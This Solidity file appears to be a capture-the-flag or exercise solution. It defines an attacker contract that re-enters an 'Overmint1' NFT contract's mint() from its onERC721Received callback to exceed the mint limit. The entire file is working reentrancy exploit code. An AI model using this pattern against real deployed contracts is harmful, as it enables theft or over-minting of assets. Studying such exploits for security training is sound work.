// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

import {Overmint1} from "./Overmint1.sol";

contract Overmint1Attacker {
    Overmint1 public target;
    address public owner;

    constructor(address _target) {
        target = Overmint1(_target);
        owner = msg.sender;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        target.transferFrom(address(this), owner, tokenId);

        if (!target.success(owner)) {
            target.mint();
        }

        return this.onERC721Received.selector;
    }

    function attack() public {
        target.mint();
    }
}
